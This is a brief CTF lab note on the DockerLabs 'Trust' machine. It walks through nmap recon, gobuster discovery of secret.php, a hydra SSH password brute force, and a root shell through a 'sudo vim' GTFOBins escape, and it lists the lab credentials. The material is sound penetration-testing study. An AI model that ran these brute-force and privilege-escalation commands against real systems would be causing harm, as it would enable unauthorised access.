---
type: machine
platform: dockerlabs
difficulty: super-easy
ip: 172.17.0.2
cves: []
tools: [nmap, gobuster, hydra]
techniques: [directory-fuzzing, ssh-bruteforce, sudo-abuse, suid-enumeration]
tags: [ejpt:assessment, ejpt:host-net-pentest, ejpt:web-pentest]
related: [[obsession]], [[simple-ctf]]
---

# Trust

**Writeup:** [raw writeup](../../writeups/dockerlabs/super-easy/trust.md)

Web + SSH box ending in a [[sudo-abuse|sudo vim]] privilege escalation.

## Path

1. **Recon** — `nmap` shows `22/tcp ssh` and `80/tcp http`.
2. **Web enum** — [[gobuster]] finds `secret.php`, hinting a username (`mario`).
3. **Brute force** — `hydra -l mario -P rockyou.txt` → password `chocolate`.
4. **Escalation** — `sudo vim -c ':!/bin/sh' /dev/null` (GTFOBins) → root.

## Credentials

| User | Password |
|------|----------|
| mario | `chocolate` |

## Takeaways

- `sudo -l` (here implied by the `sudo vim` PoC) reveals the path; [[gtfobins]] provides the exact payload for each binary.
- The same `sudo vim` payload reappears in [[obsession]] and [[simple-ctf]] — a recurring pattern.
